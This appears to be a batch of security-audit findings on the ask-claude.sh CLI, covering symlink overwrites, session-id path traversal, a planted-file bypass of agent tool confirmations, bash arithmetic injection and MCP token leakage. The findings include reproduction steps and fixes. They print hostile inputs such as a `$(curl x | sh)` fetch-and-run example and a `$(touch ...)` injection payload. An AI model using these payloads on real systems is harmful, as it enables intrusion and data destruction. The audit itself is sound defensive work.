Live branch: curl -o "$name.part" opens the existing symlink and writes the API-served file bytes into its target; mv at 703 then leaves $name as the symlink

evidence.description: if [ -e "$name" ] && [ "${usage_force:-}" != true ]: the existence check covers $name only
cat "$ASK_CLAUDE_REPLAY/files/$name" >"$name.part": a non-exclusive redirect that follows a symlink (reproduced)
curl ... -o "$name.part": curl opens the output without O_EXCL/O_NOFOLLOW (reproduced with curl 8.5.0 against a loopback server)
mv -- "$name.part" "$name" renames the symlink itself, so $name ends up pointing at the overwritten file

conditions.description: The download directory already contains <name>.part as a symlink (existing target or dangling) planted by a lower-trust party, for example a committed symlink in a cloned repository or another account in a shared directory not covered by protected_symlinks.
The user runs `ask-claude agent files <sesn> <name>` in that directory, for a session that holds a file whose filename equals <name>. The attacker must predict that name.

execution.attacker_perspective: A party that controls entries in the user's working directory, but not the user's account, plants <name>.part as a symlink to a file it wants overwritten. The bytes come from the session file that the agent produced and the API served.
instructions: In the sandbox (no external network), create work dir W with report.txt.part -> /scratch/t/victimB.txt, where victimB.txt holds 'precious-B'.
Start a loopback Perl HTTP server on 127.0.0.1:18080 that serves the listing and content above (agents/v06/artifacts/t/srv.pl).

From W run bash /target/ask-claude.sh with usage_cmd='agent files' usage_session=sesn_FIXTURE01 usage_name=report.txt usage_base_url=http://127.0.0.1:18080 usage_model=m usage_max_tokens=16000 ANTHROPIC_API_KEY=sk-ant-test-not-a-key (agents/v06/artifacts/t/run.sh, case B). Case A repeats this with ASK_CLAUDE_REPLAY set to a replay dir instead of the server.
Read victimB.txt and list W.
execution.observed_result: Live curl branch: 'ask-claude: wrote report.txt (15 bytes)', exit 0. The server logged both GETs. victimB.txt changed from 'precious-B' to 'AGENTDATA-CURL', and W/report.txt is now a symlink to /scratch/t/victimB.txt. The replay branch gave the same result (victimA.txt became 'AGENTDATA'). Control: with a plain existing report.txt and no .part symlink, the run is refused with exit 2.

remediation.strategy: Write to a temporary file created exclusively with mktemp in the cwd (O_EXCL, so a planted name cannot redirect the write), then rename it onto $name. Refuse when $name is a symlink or any non-regular file, even with --force, so that rename never follows a link or moves the file into a directory. This enforces the invariant at the open instead of extending the existence check, which would remain a check-then-use race.

code_changes.fixed_code:
local sesn=$1 page name id size tmp
  ...
    if [ -L "$name" ] || { [ -e "$name" ] && [ ! -f "$name" ]; }; then
      die "$name exists here and is not a regular file; refusing"
    fi
    if [ -e "$name" ] && [ "${usage_force:-}" != true ]; then
      die "$name exists here; --force overwrites it"
    fi
    tmp=$(mktemp "./.${name}.XXXXXX") || die "cannot create a temporary file here"
    if [ -n "${ASK_CLAUDE_REPLAY:-}" ]; then
      cat "$ASK_CLAUDE_REPLAY/files/$name" >"$tmp"
    elif ! curl -sS --fail --max-time 600 "$BASE_URL/v1/files/$id/content" -H @<(ma_headers) -o "$tmp"; then
      rm -f "$tmp"; echo "ask-claude: download of $name failed" >&2; return 1
    fi
    mv -f -- "$tmp" "$name"

likelihood.reason: The attacker must plant a <name>.part symlink in the exact directory where the user downloads and must predict the session filename the user asks for. The user must then run `agent files` with that name there.

impact.reason: Demonstrated: bytes chosen by the agent or endpoint overwrite, or newly create, an arbitrary file the user can write, outside the cwd. Code execution through a shell rc or a similar file is plausible but was not demonstrated.

confidence.reason: An independent sandbox run reproduced the overwrite on both write branches: replay (697) and the live curl -o branch (698, curl 8.5.0 against a loopback server through the real base-url path). macOS curl/bash open semantics were not run here but use the same non-exclusive open.

title: API-supplied Managed Agents session id is used as a file name, letting the endpoint overwrite any user-writable file
description: session_create takes .id from the POST /v1/sessions response and checks only that it is non-empty. After a successful turn, session_remember writes agent=/environment=/created= lines to "$SESSIONS/$id". An id with ../ segments escapes $STATE/sessions, and the > redirect truncates and overwrites any file the user can write. With the default ~/.local/state layout, the home directory is 4 levels up, so ~/.bashrc or ~/.ssh/authorized_keys can be reached. The endpoint also controls whether the turn succeeds: the stream URL is built without curl -g, curl normalises the ../ segments out of it, and the request still goes to the same endpoint host, which answers with an idle end_turn event. Both the one-shot path (782-784) and the interactive session_loop (648-649) reach the sink.
root_cause: The session id crosses from network-controlled JSON into a filesystem path (ask-claude.sh:571 -> 584) with no single-component or charset check. The script applies such checks to the chat name (182), to user session prefixes (591) and to download names (690), but not to this API-derived value.
intended_behavior: Only an id that matches the API's id shape (for example ^sesn_[A-Za-z0-9_-]+$) is accepted. Any other id is an API error and is never written under $STATE/sessions.

trace.description: ma_call POST /sessions returns JSON that the endpoint at BASE_URL controls
sesn=$(jq -r '.id // empty'); only emptiness is checked (572-577), then the raw id is echoed
sesn is captured from session_create; session_turn "$sesn" (783) returns 0 when the endpoint answers the normalised stream URL with an idle end_turn event
printf ... >"$SESSIONS/$1" opens and truncates the traversed path

evidence.description: No format check on the id beyond non-empty
Redirect to $SESSIONS/$1 with the raw id
Same sink reached from the interactive session_loop (reproduced locally as well)
Sibling control: user-supplied session prefixes are rejected when they contain '/' or glob characters. The script protects this path from user input but not from API input.
The base-url gate admits any https:// host and http:// loopback, so a non-Anthropic endpoint is a supported configuration

conditions.description: The user points --base-url at an https host (or a loopback service) that returns a malicious session id. This can be a hostile, compromised or misconfigured Anthropic-compatible endpoint. The default api.anthropic.com is trusted, so the attack does not apply there unless that service is compromised.
The user starts an agent session (one-shot, or the first line of the session loop).
The target file is writable by the user, and its depth relative to $STATE/sessions is known (with the default layout, ~ is 4 levels up).

execution.attacker_perspective: An API endpoint that the user configured with --base-url replies to POST /v1/sessions with a traversal id, and replies to the stream GET with an idle end_turn event.
instructions: In the parent sandbox (no network, uid 1000, HOME=/scratch), start a loopback perl fixture on 127.0.0.1:8766. It serves the first payload for POST /v1/sessions and the second payload for any GET .../events/stream (agents/v07/artifacts/sid/srv.pl).
Create /scratch/victim.txt containing 'precious user file'.

Run bash /target/ask-claude.sh with usage_cmd=agent usage_prompt=hi usage_agent=agent_v07 usage_environment=env_v07 usage_budget=100 usage_max_tokens=16000 usage_model=m usage_base_url=http://127.0.0.1:8766 ANTHROPIC_API_KEY=sk-ant-test-not-a-key (agents/v07/artifacts/sid/run.sh).
Read /scratch/victim.txt.
execution.observed_result: Exit 0. The fixture saw 'POST /v1/sessions' and 'GET /victim.txt/events/stream'. /scratch/victim.txt changed from 'precious user file' to 'agent=agent_v07\nenvironment=env_v07\ncreated=20261105T194314', and $STATE/sessions stayed empty. The session_loop variant (stdin 'hi' then '/quit', id ../../../../victim2.txt) also exited 0 and overwrote /scratch/victim2.txt the same way.

remediation.strategy: Validate the id where it enters (session_create) against the API's id grammar, and refuse to write session state for any other id. As defence in depth, check the id again in session_remember. This enforces the single-component invariant on the API value itself and does not move trust elsewhere. Suggestion, outside this record's root cause: apply the same check before the id is placed in URL paths and before it is printed in the status line.

code_changes.fixed_code:
sesn=$(jq -r '.id // empty' <<<"$resp" 2>/dev/null)
  if [[ ! $sesn =~ ^sesn_[A-Za-z0-9_-]{1,128}$ ]]; then
    err=$(api_error "$resp")
    echo "ask-claude: API error: ${err:-unexpected session id}" >&2
    return 1
  fi
  echo "$sesn"

likelihood.reason: The user must target a hostile or compromised API endpoint with --base-url. The default endpoint is trusted.

impact.reason: Any user-writable file at a known relative depth can be truncated and overwritten, for example dotfiles or authorized_keys. That is a loss of integrity and availability. The written content is fixed (the user's own agent and environment ids and a timestamp), so the attack does not give code execution.

confidence.reason: Independently reproduced twice, through the one-shot and session_loop paths, with the unmodified script against a fresh loopback fixture in the parent sandbox. Every trace line was checked against source. The id is extracted with only jq '.id // empty', so the jq 1.7 vs 1.8.2 difference does not affect the result.

title: State-dir gate ignores a failed chmod and never checks the owner, so a directory another account owns is accepted and its planted .always.<pid> files auto-allow tool confirmations
description: The gate at ask-claude.sh:113-120 is meant to refuse a $STATE in which other accounts can plant names. It discards the status of `mkdir -p "$STATE" && chmod 700 "$STATE"` and then checks only the group/other write bits of the resolved directory (ls -ldnL follows a symlink). A $STATE that another account owns with mode 755, or a $STATE path that is a symlink to such a directory, passes the gate. The owner of that directory can pre-create $STATE/.always.<N> for the whole PID range. session_confirm (434-437) returns allow when $STATE/.always.$$ exists, whoever created it, and it does this before the no-TTY deny at 438-442. Every tool confirmation of the victim's Managed Agents session is then answered allow without a prompt, including in unattended runs that would otherwise deny. The same owner also controls .stream.$$ (480/484) and sessions/ entries. Exploitation needs the victim's XDG_STATE_HOME (or HOME) to resolve to a location where another local account can create or own the ask-claude directory.
claimed_root_cause: ask-claude.sh:113 runs `mkdir -p "$STATE" && chmod 700 "$STATE"` and ignores the result (set -uo pipefail, no -e). Lines 118-120 test only the group/other write bits from `ls -ldnL | cut -c6,9`. There is no owner/uid comparison, no refusal of a symlinked $STATE, and no check of parent directories. $STATE honours XDG_STATE_HOME (line 66), so it can resolve outside $HOME. session_confirm (434) treats the existence of a fixed-name file in $STATE as a standing allow grant, without checking who created it.

trace.description: STATE is ${XDG_STATE_HOME:-$HOME/.local/state}/ask-claude, from the environment
mkdir -p && chmod 700; a chmod failure on a directory another account owns is ignored
Only group/other write bits of the symlink-resolved directory are tested; owner, symlink and parents are not checked
An existing $STATE/.always.$$ yields allow without a prompt, before the no-TTY deny at 438

evidence.description: Unchecked mkdir/chmod result
Write-bit-only check via ls -ldnL | cut -c6,9
File existence is treated as an allow grant, checked before the TTY check
No-TTY deny comes after the .always check, so a planted grant overrides it
The legitimate always grant is created with : > and never removed or owner-checked
The stream log is a fixed name in $STATE, truncated with : > at 484

blockers: The parent sandbox runs as a single uid (1000), so a second account that owns $STATE and plants .always.<pid> cannot be staged. Locally verified in parts: the real script passes the gate for a uid-0 mode-755 $STATE, and a pre-existing .always.<pid> that the current run did not create turns a no-TTY deny into allow. The two-account chain end to end is not observed.

Whether a real user sets XDG_STATE_HOME (or HOME) to a path where another local account can create, own, or symlink the ask-claude directory (for example under /tmp or a shared or network home) is a deployment fact outside source. Without it there is no second principal and no impact.

validation_plan.local: On a disposable multi-user Linux VM with no network: as account B, mkdir -m 755 /tmp/xs /tmp/xs/ask-claude and touch /tmp/xs/ask-claude/.always.{1..99999}. As account A, with the agents/v08 fixtures copied to /home/A/fx (1.sse ends requires_action with an agent.tool_use for bash; 2.sse ends end_turn), run: usage_model=m usage_max_tokens=16000 usage_cmd=agent usage_agent=agent_X usage_environment=env_X usage_budget=0 usage_prompt=hi ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_REPLAY=/home/A/fx ASK_CLAUDE_REQUEST_LOG=/home/A/reqlog XDG_STATE_HOME=/tmp/xs bash ask-claude.sh </dev/null. Expected if vulnerable: stderr shows 'ask-claude: allowed bash' and reqlog has a user.tool_confirmation with result allow. Control: the same command with an A-owned mode-700 state dir with no .always files prints 'denied ... stdin is not a terminal'. Regression for the fix: the gate must die when stat -c %u "$STATE" differs from id -u, when $STATE is a symlink, or when mkdir/chmod fails.
validation_plan.deployment: The owner checks whether any machine or shared host where ask-claude runs sets XDG_STATE_HOME or HOME to a path where another local account can create directories or symlinks (for example a world-writable /tmp subtree or a shared home), and reports the path and its parent ownership and mode. No audit traffic is sent anywhere.

title: `just ask` re-parses the user's question as shell: no quote() on {{question}} and {{FLAGS}}
description: The ask recipe (justfile:6-7) renders `./ask-claude.sh {{FLAGS}} {{question}}` with no quote(). The justfile has no `set shell` or `set positional-arguments` (only `import` at line 1), so the line runs under just's default `sh -cu` with the argument text substituted verbatim. Shell metacharacters in a question the user quoted for their own shell ($(...), backticks, ;, |, >) are therefore evaluated a second time, and a multi-word question is split into several argv entries even though ask-claude.sh declares a single `[prompt]` positional (ask-claude.sh:5). Sibling recipes use quote() for free text (justfile:36,39,71,93; effver.just:11). The defect is real in source, but the only writer of `question` and `FLAGS` is the local full-authority user typing the just command, so it does not cross a trust boundary.
claimed_root_cause: justfile:7 interpolates the free-text parameter `question` and the variadic `FLAGS` unquoted into a recipe line that just runs with `sh -cu`, while the rest of the file uses quote() for user text.

trace.description: `ask question="" *FLAGS:` takes question and FLAGS from just's argv, which the local user's own shell has already unquoted. No lower-trust principal writes this argv.
`./ask-claude.sh {{FLAGS}} {{question}}` is substituted verbatim (no quote()) and run by the default recipe shell `sh -cu`, which re-parses the text as shell with the same user's authority.

evidence.description: No quote() on {{question}} or {{FLAGS}}; the justfile sets no shell or positional-arguments setting, so the default `sh -cu` applies.
Sibling recipe `unit-test` uses {{ quote(unit) }}, which shows the intended pattern for free text.
`#USAGE arg "[prompt]"` declares one positional prompt, so the unquoted split of a multi-word question is also a functional bug.

reason: Source confirms the unquoted interpolation, and just's verbatim-interpolation and default `sh -cu` semantics are documented behavior, so the hunter's blocker (just absent from the sandbox) is not decisive. The decisive fact is answerable from source and the architecture: the only writer of `question` and `FLAGS` is the local developer, who is the full-authority principal (architecture: user and operator are the same local developer) and who invokes the recipe from their own shell. No lower-trust actor (API endpoint, model output, MCP server, commit author) controls the argument, so SUPPLY-CHAIN-AND-RELEASE validation rule 1 is not met and the command that runs has exactly the authority the user already exercises by typing it. The remaining scenario, a user pasting attacker-authored text such as `$(curl x | sh)` into `just ask '...'`, requires the victim to place the payload on their own command line in a repo-local developer convenience recipe that is not the installed CLI; that is a footgun, not a vulnerability crossing a boundary. Keep as a hardening/correctness note: change line 7 to `./ask-claude.sh {{ FLAGS }} {{ quote(question) }}` (or use [positional-arguments] with `"$@"`), which also fixes multi-word questions being split against the single `[prompt]` positional.

title: One ASK_CLAUDE_MCP_TOKEN is attached to every --mcp server, so each listed server operator can receive the credential meant for another
description: When --mcp is given more than once and ASK_CLAUDE_MCP_TOKEN is set, lib/request.jq attaches the same token as authorization_token to every mcp_servers entry in the Messages request. If the provider's MCP connector presents authorization_token to each server URL as its bearer credential, the operator of any listed server (for example a public MCP server used next to a private one) receives the token issued for the other server and can act as the user against it. The CLI has no per-server token mapping and gives no warning when one token meets several servers. The attacker is limited to the operator of an MCP server the user chose to list; the README documents the token as applying to 'the --mcp servers', so the fan-out is documented but the credential audience is never narrowed.
claimed_root_cause: lib/request.jq:58-59 builds every mcp_servers entry from the space-separated $mcp list and adds authorization_token: env.ASK_CLAUDE_MCP_TOKEN to each one, with no per-server token mapping. ask-claude.sh:101-103 checks only that each --mcp value starts with https://.

trace.description: Each user-supplied --mcp value (usage_mcp) is checked only for an https:// prefix; any number of servers is accepted.
The space-joined URL list is passed to lib/request.jq as --arg mcp.
Every server object built from $mcp gets authorization_token: env.ASK_CLAUDE_MCP_TOKEN when the variable is non-empty.
The body is sent with curl to the Messages API; the provider's MCP connector then connects to each listed URL with the attached token (provider side, not observable offline).

evidence.description: The same environment token is added to every mcp_servers entry; there is no per-URL token source.
The --mcp flag is repeatable, and its help says 'ASK_CLAUDE_MCP_TOKEN for its auth' (singular) with no scoping.
The README documents the variable as the 'authorization token for the --mcp servers', with no per-server scoping or warning.

blockers: Whether the provider's MCP connector sends each entry's authorization_token to that entry's server URL (for example as 'Authorization: Bearer <token>') is provider-side behaviour and cannot be observed offline. Locally it is established only that the request body binds the second server to the same token as the first (agents/v10/artifacts/mcp2-result.txt).

validation_plan.local: Done, bounded and offline: in the sandbox, ASK_CLAUDE_REPLAY=tests/fixtures/sse/text.sse, ASK_CLAUDE_REQUEST_LOG=/scratch/out/req.jsonl, ASK_CLAUDE_MCP_TOKEN=dummy_token_for_private_A, usage_mcp='https://private-a.example/mcp https://public-b.example/mcp', usage_prompt=ping, bash /target/ask-claude.sh; then jq -c '{mcp_servers,tools}' on the log. Result: both mcp_servers entries (private-a-example and public-b-example) carry authorization_token dummy_token_for_private_A.
validation_plan.deployment: The owner runs one live one-shot with ASK_CLAUDE_MCP_TOKEN=dummy-not-a-secret and two --mcp URLs, both owner-controlled https endpoints that log request headers and accept the dummy credential. Confirm whether the second endpoint receives 'Authorization: Bearer dummy-not-a-secret'. Use only dummy credentials and owner-controlled endpoints.

title: check-effver runs commands from a commit's VERSION through bash arithmetic on an unvalidated parent version
description: check-effver reads VERSION and CHANGELOG.md from commit trees in a git range or jj revset without checking them out. It matches only the VERSION of the commit under check against version_re (line 85). The VERSION of each parent commit (line 72) becomes $old (line 75) with no validation and reaches bump() at line 103. bump() splits $old on dots (line 54) and evaluates the parts in $((...)) (lines 56-60). Bash arithmetic evaluates a variable's value recursively as an expression, and it expands an array subscript in that value, including $(...). So a parent VERSION such as 0.4.x[$(cmd)] runs cmd. The malformed parent VERSION is reported as a problem when that commit is checked, but the loop continues. The payload runs when the next commit, which has a valid VERSION, a valid first CHANGELOG heading and a different version, is checked. An author who supplies both commits in a range that a developer checks gets command execution as that developer. The developer only has to run the checker, not any code from the branch.
root_cause: tools/effver/check-effver applies version_re (line 85) only to $version, the VERSION of the commit under check. The parent VERSION pv (line 72) goes into $old (line 75) unvalidated, and bump "$old" "$effort" (line 103) evaluates the attacker-controlled parts x/y/z in bash arithmetic (lines 56-60). The problem that line 86 records for the malformed commit does not stop the same string being used as a parent version later.
intended_behavior: Only strings that match ^[0-9]+\.[0-9]+\.[0-9]+$ reach bump()'s arithmetic. A parent with a malformed VERSION produces a reported problem and no arithmetic evaluation.

trace.description: ids=$(git rev-list --reverse RANGE): the commits in the range, authored by whoever wrote them. The --jj path at line 40 enumerates commits the same way.
pv=$(show "$p" VERSION): raw tree content of the parent commit, not validated.
old = highest parent version by sort -V; still the raw string (with one parent, it is that parent's VERSION).
want=$(bump "$old" "$effort"), reached when the child's VERSION and first heading are valid (effort set at line 94), a parent had VERSION (had=1), and the child's VERSION differs (same=0).
IFS=. read -r x y z: z keeps everything after the second dot, so the split does not limit the payload.
$((z + 1)) evaluates z's value x[$(cmd)] as an arithmetic expression, and the subscript's command substitution runs. Lines 56 and 58-60 are the same sink for x and y with the other effort branches.

evidence.description: version_re is applied only to the current commit's VERSION. A mismatch appends to problems at line 86, and the for loop at line 65 continues to the next commit.
The parent VERSION is never matched against version_re before it becomes $old.

Arithmetic over unvalidated $z. Independent sandbox run (bash 5.2.21, git 2.51.1, no network) created /scratch/MARKER_v11. A valid-parent control exited 0, and a patched copy that validates parents and bump()'s argument did not create the marker (agents/v11/artifacts/poc-v11.out).
`just check-effver [revset]` runs the checker with --jj over the stack not yet on trunk by default (line 26 of check-effver), which can contain commits by other authors.

conditions.description: A developer runs check-effver, with a git range or through `just check-effver` with a jj revset, over a range that contains the attacker's commits.

The crafted VERSION commit is a parent of a later commit in the range. That later commit has a valid VERSION, a valid first CHANGELOG heading with a non-empty section, and a VERSION different from the parent. The attacker can author both commits. With more than one parent, the crafted string must sort highest under sort -V.

Under set -u, the subscript base must be a set variable (x, y or z inside bump, or BASH_VERSINFO); an unset name aborts before the subscript expands. Reproduced on bash 5.2.21; bash 5.3 on the host was not exercised.

execution.attacker_perspective: A contributor who can author commits in a range that the maintainer checks with check-effver, with no need for the maintainer to run any code from that branch.
payloads: VERSION in the child commit: 0.4.1, with first CHANGELOG.md heading `## 0.4.1 (micro) - 2026-11-05` and a non-empty section
instructions: In the sandbox, create a git fixture repo with three commits on main: base (VERSION 0.4.0, heading `## 0.4.0 (macro) - 2026-11-05`), parent (VERSION set to the payload), and child (VERSION 0.4.1 with the valid micro heading).
Confirm /scratch/MARKER_v11 does not exist.
Run the unmodified target checker read-only from the fixture repo: bash /target/tools/effver/check-effver main~2..main
Check whether /scratch/MARKER_v11 exists. As a control, repeat with the parent VERSION 0.4.0 and expect exit 0.
execution.observed_result: check-effver printed `VERSION is "0.4.x[$(touch /scratch/MARKER_v11)]", not MACRO.MESO.MICRO` for the parent commit and exited 1, and /scratch/MARKER_v11, absent before the run, had been created. The control with a valid parent exited 0. A patched copy that rejects a malformed parent and makes bump() validate its argument exited 1 and did not create its marker.

remediation.strategy: Validate every VERSION string before arithmetic. In the parent loop, report a parent VERSION that does not match version_re and do not fold it into $old. Make bump() reject an argument that does not match version_re, and treat that failure as a problem at line 103. Use 10#$n in the arithmetic only after validation, so leading zeros are not read as octal. This enforces the invariant at the sink (bump) as well as at the source, so no caller can move trust around it.

code_changes.fixed_code:
bump() {
  # Only a validated MACRO.MESO.MICRO string may reach arithmetic.
  [[ $1 =~ $version_re ]] || return 1
  local x y z
  IFS=. read -r x y z <<<"$1"
  case "$x:$2" in
    0:macro) echo "0.$((10#$y + 1)).0" ;;
    0:*) echo "0.$y.$((10#$z + 1))" ;;
    *:macro) echo "$((10#$x + 1)).0.0" ;;
    *:meso) echo "$x.$((10#$y + 1)).0" ;;
    *:micro) echo "$x.$y.$((10#$z + 1))" ;;
  esac
}

  # parent loop (replaces lines 71-77):
  for p in $(parents "$id"); do
    if pv="$(show "$p" VERSION)"; then
      had=1
      if ! [[ $pv =~ $version_re ]]; then
        problems+=("parent ${p:0:12} VERSION is not MACRO.MESO.MICRO")
        continue
      fi
      [ "$pv" = "$(show "$id" VERSION 2>/dev/null || true)" ] && same=1
      old="$(printf '%s\n%s\n' "$old" "$pv" | sed '/^$/d' | sort -V | tail -n 1)"
    fi
  done

  # bump check (replaces line 103):
      want="$(bump "$old" "$effort")" || want=""

# Regression fixture: base 0.4.0 -> parent VERSION 0.4.x[$(touch MARKER)] -> child 0.4.1 (micro);
# check-effver must exit 1 and MARKER must not exist.

likelihood.reason: The developer has to run check-effver over a range that contains a hostile commit pair. Nothing in the repository runs it automatically, and the default jj revset covers only the local stack not yet on trunk, so a foreign commit must first be fetched or rebased into it. The checker prints the malformed VERSION only after the payload has run.

impact.reason: Arbitrary command execution as the developer on the developer machine, which holds .env with ANTHROPIC_API_KEY and VCS credentials. The tool is designed to read commit content without running it.

confidence.reason: Complete source trace, and an independent bounded sandbox reproduction against the unmodified target script, with a negative control and a fix check.
